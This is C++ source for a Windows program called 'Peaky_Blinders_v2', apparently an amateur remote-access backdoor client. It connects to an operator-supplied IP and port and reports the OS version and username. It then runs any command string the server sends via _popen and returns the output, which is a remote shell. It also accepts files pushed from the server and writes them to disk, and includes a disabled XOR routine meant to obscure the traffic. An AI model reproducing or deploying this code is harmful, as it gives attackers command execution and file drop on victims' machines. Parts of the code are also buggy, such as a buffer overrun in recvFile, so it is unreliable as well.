// Peaky_Blinders_v2.cpp : Defines the entry point for the console application.
//

//libraries
#include "stdafx.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <IPHlpApi.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <VersionHelpers.h>
#include <fstream>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

class Socks {
protected:
	WSADATA wsaData;
	SOCKET ConnectSocket;
	std::string port;
	std::string ipaddr;

public:
	Socks();
	~Socks();
	void resolve(addrinfo **info);
	int createclientsocket(addrinfo *info);
	int sendData(std::string msg);
	int recvData();
	void endclient();
	int sendFile();
	int recvFile();
};

//Constructor
//Initializes socket
Socks::Socks() {
	int iResult = 0; //initialization result
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		printf_s("Socket Initialization: %d\n", iResult);
		//system("pause");
		WSACleanup();
		exit(10);
	}

	//Create a socket
	/*mySocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (mySocket == INVALID_SOCKET)
	{
	printf("Socket Initialization: Error creating socket");
	system("pause");
	WSACleanup();
	exit(11);
	}
	 //
	myBackup = mySocket;*/
}

//Deconstructor
Socks::~Socks() {
	WSACleanup();
}

//resolves address and port
void Socks::resolve(addrinfo **info) {
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	//get ip address
	std::cout << "IP Address: ";
	std::cin >> ipaddr;

	//get port number
	std::cout << "Port: ";
	std::cin >> port;

	//get address information
	int result = getaddrinfo(ipaddr.c_str(), port.c_str(), &hints, info);
	if (result != 0) {
		printf("getaddrinfo failed with error: %d\n", result);
		WSACleanup();
		exit(1);
	}
}

//creates client socket
int Socks::createclientsocket(addrinfo *info) {
	ConnectSocket = socket(info->ai_family, info->ai_socktype,
		info->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		//printf("broken");
		return 1;
	}
	else
	{
		///////DOESN'T WORK WITHOUT SERVER//////////////
		//connect to server
		int result = connect(ConnectSocket, info->ai_addr,
			(int)info->ai_addrlen);
		if (result == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			printf("broken");
			return 2;
		}
		////////////////////////////////////////////////
	}
	return 0;
}

//send data
int Socks::sendData(std::string msg) {
	int result = 0;
	std::string peaky = "enCRAPtion";
	int peaky_len = peaky.length();
	//send client information
	if (msg == "") {
		//gets operating system version
		if (!IsWindows8OrGreater()) {
			msg = "Less than Windows 8";
		}
		else
			msg = "Is Windows 8 or greater";

		//get username
		std::string username = "";
		std::cout << "Enter user name: ";
		std::cin >> username;

		msg = "CLIENT_INFO\nOS: " +  msg + "\nUser Name: " + username + "\nIP Address: " + ipaddr + "\nPort: " + port;
	}
	//printf("Plaintext String before encryption %s", msg.c_str());
	//sends server information about client
	//encryption
	/*
	int msg_len = msg.length();
	for (int i = 0, x = 0; i < msg_len; i++, x++) {
		if (x >= peaky_len) {
			x = 0;
		}
		msg[i] = msg[i] ^ peaky[x];
	} */
	//printf("Encrypted String sent to server: %s", msg.c_str());
	result = send(ConnectSocket, msg.c_str(), msg.length(), 0);
	if (result == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 7;
	}
	
	return 0;
}

//recieve data
int Socks::recvData() {
	int result = 0;
	char recvbuf[512];
	std::string msg = "";
	std::string peaky = "enCRAPtion";
	int peaky_len = peaky.length();

	result = recv(ConnectSocket, recvbuf, 512, 0);

	if (result > 0) {
		//parse actual data from message
		for (int i = 0; i < 512; i++) {
			if (recvbuf[i] > 0)
				msg = msg + recvbuf[i];
		}
		/*
		int msg_len = msg.length();
		//unencrypt
		for (int i = 0, x = 0; i < msg_len; i++, x++) {
			if (x >= peaky_len) {
				x = 0;
			}
			msg[i] = msg[i] ^ peaky[x];
		}*/
		printf("Unencrypted message: %s\n", msg.c_str());
		//////////////////////Parse msg for the word "upload"/////////////////////
		if (msg == "upload") {
			printf("Upload command recieved\n");
			recvFile();

		}
		else {
			//////////////////////////////////////////////////////////////////////////
			//need to pipe output into char array
			//take address from captured response
			char buffer[4000];
			std::string data = "";
			//runs a command 
			FILE* _pipe = _popen(msg.c_str(), "r");
			//redirects stdout to pipe and adds elements of buffer to result string
			if (!_pipe) {
				std::cout << "ERROR" << std::endl;
			}

			while (!feof(_pipe)) {
				//place characters in buffer into string
				if (fgets(buffer, 4000, _pipe) != NULL)
					data += buffer;
			}
			_pclose(_pipe);
			sendData(data);
		}
	}
			else if (result == 0)
				printf("Connection closed\n");
			else
				printf("recv failed: %d\n", WSAGetLastError());
		
	return 0;
}

//sends file
int Socks::sendFile() {
	int result = 0;
	std::string msg;
	std::string peaky = "enCRAPtion";
	int peaky_len = peaky.length();
	//read file

	int msg_len = msg.length();

	for (int i = 0, x = 0; i < msg_len; i++, x++) {
		if (x >= peaky_len) {
			x = 0;
		}
		msg[i] = msg[i] ^ peaky[x];
	}
	result = send(ConnectSocket, msg.c_str(), msg.length(), 0);
	if (result == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 7;
	}
	return 0;
}


int Socks::recvFile() {
	const int RECVCHUNK = 8096;
	char recvbuf[1500];
	std::fstream recvFile;					//create a new filestream for recv'd data
	std::string fileName;					//for the directory sent from server
	int result = 0;
	std::string peaky = "enCRAPtion";
	int peaky_len = peaky.length();

	////////////////////////////////
	// Send "okay" to acknowledge the upload command sent
	////////////////////////////////
	sendData("okay");			//Acknowledge the upload command sent
	//printf("We just sent \"okay\" to the server\n");

	/////////////////////////////////
	//recv the fileName (directory)
	/////////////////////////////////
	result = recv(ConnectSocket, recvbuf, RECVCHUNK, 0);	
	if (result > 0) {
		//parse actual data from message
		for (int i = 0; i < 512; i++) {
			if (recvbuf[i] > 0)
				fileName = fileName + recvbuf[i];
		}
		memset(recvbuf, 0, sizeof(recvbuf));			// clear the receive buffer
		//printf("Message sent from server (FILENAME):   %s\n", fileName.c_str());
		int msg_len = fileName.length();
		//unencrypt
		/* for (int i = 0, x = 0; i < msg_len; i++, x++) {		//TURN ON ENCRYPTION ON SERVER TO TEST DECRYPTION
			if (x >= peaky_len) {
				x = 0;
			}
			fileName[i] = fileName[i] ^ peaky[x];
		}
		//printf("Decrypted message: %s\n", fileName.c_str());
		*/
	}
	else if (result == 0)
		printf("Connection closed\n");
	else
		printf("recv failed: %d\n", WSAGetLastError());

	////////////////////////////////
	// Send "okay" to acknowledge the upload command sent
	////////////////////////////////
	sendData("okay");			//Acknowledge the upload command sent
								//Next message sent should be the files data
	//printf("We just sent \"okay\" to the server\n");


	////////////////////////////////
	// RECV THE FILE DATA (CAN ONLY HANDLE TEXT FILES AT THE MOMENT
	////////////////////////////////
	std::ofstream writeData;		//Output stream to store incoming file data
	
	//if (!writeData.is_open()) {
		//printf("unable to open up file");
		//return 0;
	//}
	int found = 0;						// Points to the first char found
	found = fileName.find_last_of("/"); // /Parse the directory to get the filename 
	std::string newFile = fileName.substr(found + 1, fileName.length()).c_str(); // store the filename not the full path
	writeData.open(newFile, std::ofstream::out | std::ofstream::trunc); //open up a local file to write to
	char eof[] = "EOF";					// EOF marker
	char *output;						// compare the input from server to find the EOF
	while(result > 0)
	{
		std::string fileData;		    //Store the data somewhere 
		result = recv(ConnectSocket, recvbuf, sizeof(recvbuf), 0);	//start receiving file data
		for (int i = 0; i < sizeof(recvbuf); i++) {
			if (recvbuf[i] > 0)
				fileData = fileData + recvbuf[i];
		}
		
		output = strstr(recvbuf, eof);				//See if we reached the end of file marker, if not, keep receiving data
		if (output)
		{
			//printf("recvbuf contains when exiting....  %s\n", recvbuf);
			printf("Recv EOF marker\n\n");
			writeData.close();
			break;
		}
		//writeData << fileData;					// WRITE THE DATA TO OUR OUTPUT STREAM !!
		writeData.write(fileData.c_str(), fileData.length());
		memset(recvbuf, 0, sizeof(recvbuf));	// clear the receive buffer
		//printf("CONTENTS: %s\n\n", fileData.c_str());

	}
	//printf("OUTSIDE THE RECV CALL\n\n");

	/* if (result > 0) {
		//parse actual data from message
		for (int i = 0; i < 512; i++) {
			if (recvbuf[i] > 0)
				fileData = fileData + recvbuf[i];
		}



		printf("Message sent from server (file data):   %s\n", fileData.c_str());
		int fileData_len = fileData.length();
		//unencrypt
		 for (int i = 0, x = 0; i < msg_len; i++, x++) {		//TURN ON ENCRYPTION ON SERVER TO TEST DECRYPTION
		if (x >= peaky_len) {
		x = 0;
		}
		fileName[i] = fileName[i] ^ peaky[x];
		}
		//printf("Decrypted message: %s\n", fileName.c_str());
	}
	else if (result == 0)
		printf("Connection closed\n");
	else
		printf("recv failed: %d\n", WSAGetLastError());
	 */

	//printf("END OF RECV FILE JUSTIN\n\n");

	return 0;
}


//close socket
void Socks::endclient() {
	closesocket(ConnectSocket);
	WSACleanup();
}


int main()
{
	Socks socket;
	struct addrinfo *info = NULL, *ptr = NULL;
	int result = 0;
	socket.resolve(&info);
	ptr = info;
	result = socket.createclientsocket(ptr);
	if (result > 0) {
		printf("broken");
		return 1;
	}
	freeaddrinfo(info);
	socket.sendData("");
	socket.recvData();
	std::string nullstr;
	//socket.sendData(nullstr);

	int temp = 0;
	std::cin >> temp;
	/*for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
	std::cout << "family: " << ptr->ai_family << std::endl;
	}*/
	socket.endclient();
	return 0;
}
